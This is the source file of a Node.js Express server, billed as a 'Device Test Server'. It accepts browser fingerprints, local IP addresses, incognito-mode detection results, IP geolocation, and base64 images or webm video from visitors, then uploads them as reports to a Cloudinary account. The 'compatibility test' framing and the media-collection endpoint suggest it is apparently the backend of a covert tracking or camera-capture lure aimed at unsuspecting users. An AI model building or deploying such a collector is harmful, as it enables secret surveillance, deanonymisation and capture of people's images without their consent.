require('dotenv').config(); // Load environment variables from .env file
const express = require('express');
const cloudinary = require('cloudinary').v2;
const geoip = require('geoip-lite');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');

// Validate required environment variables
const requiredEnvVars = [
  'CLOUDINARY_CLOUD_NAME',
  'CLOUDINARY_API_KEY',
  'CLOUDINARY_API_SECRET'
];

const missingVars = requiredEnvVars.filter(v => !process.env[v]);
if (missingVars.length > 0) {
  console.error('Missing required environment variables:', missingVars);
  process.exit(1);
}

// Configure Cloudinary with enhanced error handling
function configureCloudinary() {
  try {
    cloudinary.config({
      cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
      api_key: process.env.CLOUDINARY_API_KEY,
      api_secret: process.env.CLOUDINARY_API_SECRET,
      secure: true,
      timeout: 10000
    });
    console.log('Cloudinary configured successfully');
    return cloudinary;
  } catch (error) {
    console.error('Cloudinary configuration failed:', error);
    process.exit(1);
  }
}

// Test Cloudinary connection
async function testCloudinaryConnection(cloudinary) {
  try {
    console.log('Testing Cloudinary connection...');
    const testResult = await cloudinary.uploader.upload(
      'data:application/json;base64,eyJ0ZXN0Ijoic3VjY2VzcyJ9',
      {
        folder: 'connection_tests',
        resource_type: 'raw',
        overwrite: false
      }
    );
    console.log('Cloudinary connection test successful:', testResult.secure_url);
    return true;
  } catch (error) {
    console.error('Cloudinary connection test failed:', error);
    process.exit(1);
  }
}

// Helper function to format fingerprint report as plain text
function formatFingerprintReport(clientInfo, data, fingerprintHash) {
  const yn = v => v ? 'Yes' : 'No';
  const safe = v => (v !== undefined && v !== null ? v : 'Unknown');
  const geo = clientInfo.geo;
  const locationStr = geo ? [geo.city, geo.region, geo.country].filter(Boolean).join(', ') || 'Unknown' : 'Unknown';

  // Format local IPs
  const localIPv4 = Array.isArray(data.location_info?.local_ipv4) ? 
    data.location_info.local_ipv4.join(', ') : 'Unknown';
  const localIPv6 = Array.isArray(data.location_info?.local_ipv6) ? 
    data.location_info.local_ipv6.join(', ') : 'Unknown';
  // Incognito detection
  const incognitoStatus = yn(data.privacy_info?.incognito);
  const incognitoMethod = safe(data.privacy_info?.incognitoDetectionMethod);

  return `
==================================================
PRIVACY & SECURITY ASSESSMENT
==================================================
Incognito Mode: ${incognitoStatus} (method: ${incognitoMethod})
VPN Usage: Not detected
TOR Usage: Not detected

==================================================
DEVICE COMPATIBILITY TEST REPORT
==================================================
Generated: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', hour12: true })}
Collection Type: PROCESSED_FINGERPRINT

==================================================
NETWORK INFORMATION
==================================================
Public IP: ${safe(clientInfo.ip)}
Local IPv4: ${localIPv4}
Local IPv6: ${localIPv6}
Network Type: ${safe(data.network_info?.network_type || 'Unknown')}
Server-detected IP: ${safe(clientInfo.ip)}

==================================================
DEVICE & SYSTEM INFORMATION
==================================================
Operating System: ${safe(data.device_info?.operating_system)}
Browser: ${safe(data.device_info?.browser)} ${safe(data.device_info?.browser_version)}
Platform: ${safe(data.device_info?.platform)}
Mobile Device: ${yn(data.device_info?.mobile_device)}
Timezone: ${safe(data.timezone_info?.reported_timezone)}

==================================================
LOCATION & NETWORK
==================================================
IP Address: ${safe(data.location_info?.ip_address)}
Location: ${locationStr}
Timezone: ${safe(data.timezone_info?.reported_timezone)}

==================================================
DISPLAY & HARDWARE
==================================================
Screen Resolution: ${safe(data.display_info?.screen_resolution)}
Viewport Size: ${safe(data.display_info?.viewport_size)}
Color Depth: ${safe(data.display_info?.color_depth)} bits
CPU Cores: ${safe(data.hardware_info?.cpu_cores)}
Device Memory: ${safe(data.hardware_info?.device_memory)}
Touch Support: ${yn(data.hardware_info?.touch_support)}

==================================================
BROWSER CAPABILITIES
==================================================
Cookies Enabled: ${yn(data.browser_features?.cookies_enabled)}

==================================================
PRIVACY & SECURITY ASSESSMENT
==================================================
Overall Fingerprint Hash: ${safe(data.fingerprints?.overall_fingerprint_hash)}

==================================================
END OF REPORT
==================================================
`;
}

// Initialize Express app
async function initializeApp() {
  const app = express();

  app.use(helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", "'unsafe-inline'"],
        connectSrc: [
          "'self'",
          "https://api.ipify.org",
          `https://${process.env.RENDER_EXTERNAL_HOSTNAME || 'localhost:3000'}`,
          "https://res.cloudinary.com"
        ],
        imgSrc: ["'self'", "data:", "https://res.cloudinary.com"],
        mediaSrc: ["'self'", "data:", "blob:"],
        frameSrc: ["'self'"],
        fontSrc: ["'self'", "data:"]
      }
    },
    crossOriginEmbedderPolicy: false,
    crossOriginResourcePolicy: { policy: "cross-origin" }
  }));

  app.use(rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100,
    message: 'Too many requests from this IP, please try again later'
  }));

  app.use(express.json({
    limit: '10mb',
    verify: (req, res, buf) => {
      try {
        JSON.parse(buf);
      } catch {
        res.status(400).json({ error: 'Invalid JSON' });
        throw new Error('Invalid JSON');
      }
    }
  }));

  app.use(express.static('public'));

  app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    next();
  });

  const getClientIp = req => req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip;

  const getClientInfo = req => {
    const ip = getClientIp(req);
    const geo = geoip.lookup(ip);
    return {
      ip,
      geo: geo ? {
        country: geo.country,
        city: geo.city,
        region: geo.region
      } : null,
      userAgent: req.headers['user-agent'],
      timestamp: new Date().toISOString()
    };
  };

  const generateHash = data => crypto.createHash('sha256').update(JSON.stringify(data)).digest('hex');

  app.get('/', (req, res) => {
    res.json({
      status: 'active',
      message: 'Device Test Server Running',
      timestamp: new Date().toISOString(),
      version: '1.0.0'
    });
  });

  app.get('/get-ip', (req, res) => {
    res.json({ ip: getClientIp(req) });
  });

  app.post('/collect-fingerprint', async (req, res) => {
    try {
      const clientInfo = getClientInfo(req);
      if (!req.body?.data || !req.body.timestamp) {
        return res.status(400).json({ error: 'Missing required fields', required: ['data', 'timestamp'] });
      }
      const fingerprintHash = generateHash(req.body.data);
      const base64Text = Buffer.from(formatFingerprintReport(clientInfo, req.body.data, fingerprintHash)).toString('base64');

      const uploadResult = await Promise.race([
        cloudinary.uploader.upload(
          `data:text/plain;base64,${base64Text}`,
          {
            folder: 'fingerprints',
            resource_type: 'raw',
            format: 'txt',
            overwrite: false,
            unique_filename: true,
            timeout: 10000
          }
        ),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Upload timeout')), 10000))
      ]);

      res.json({ success: true, url: uploadResult.secure_url, hash: fingerprintHash });
    } catch (error) {
      console.error('[ERROR] Fingerprint collection failed:', error);
      res.status(500).json({ error: 'Failed to save fingerprint', details: process.env.NODE_ENV === 'development' ? error.message : null });
    }
  });

  app.post('/collect-media', async (req, res) => {
    try {
      const { data, metadata } = req.body;
      if (!data || !metadata?.media_type) {
        return res.status(400).json({ error: 'Invalid media data', required: ['data', 'metadata.media_type'] });
      }

      const clientInfo = getClientInfo(req);
      const resourceType = metadata.media_type === 'image' ? 'image' : 'video';

      const uploadResult = await cloudinary.uploader.upload(
        `data:${resourceType === 'image' ? 'image/jpeg' : 'video/webm'};base64,${data}`,
        {
          folder: 'media',
          resource_type: resourceType,
          overwrite: false,
          unique_filename: true,
          timeout: 15000
        }
      );

      res.json({ success: true, url: uploadResult.secure_url, public_id: uploadResult.public_id });
    } catch (error) {
      console.error('Media upload error:', error);
      res.status(500).json({ error: 'Failed to save media', details: process.env.NODE_ENV === 'development' ? error.message : null });
    }
  });

  app.post('/get-local-location', async (req, res) => {
    try {
      const { ip } = req.body;
      if (!ip) return res.status(400).json({ error: 'IP required' });

      // Option 1: Use a local IP geolocation database
      const geo = geoip.lookup(ip);
      // Option 2: Use a paid API service (more accurate)
      // const apiResponse = await fetch(`https://ipapi.co/${ip}/json/`);
      // const geo = await apiResponse.json();

      if (!geo) return res.json({ error: 'Location not found' });

      res.json({
        ip,
        city: geo.city || 'Unknown',
        region: geo.region || 'Unknown',
        country: geo.country || 'Unknown',
        ll: geo.ll || [0, 0],
        metro: geo.metro || 0,
        range: geo.range || []
      });
    } catch (error) {
      console.error('Location error:', error);
      res.status(500).json({ error: 'Location service failed' });
    }
  });

  app.use((req, res) => {
    res.status(404).json({ error: 'Not found' });
  });

  app.use((error, req, res, next) => {
    console.error('Server error:', error);
    res.status(500).json({ error: 'Internal server error' });
  });

  return app;
}

async function startApplication() {
  try {
    const cloudinaryInstance = configureCloudinary();
    await testCloudinaryConnection(cloudinaryInstance);
    const app = await initializeApp();
    const PORT = process.env.PORT || 3000;
    app.listen(PORT, () => {
      console.log(`Server running on port ${PORT}`);
      console.log(`Environment: ${process.env.NODE_ENV || 'development'}`);
    });
  } catch (error) {
    console.error('Application startup failed:', error);
    process.exit(1);
  }
}

startApplication();
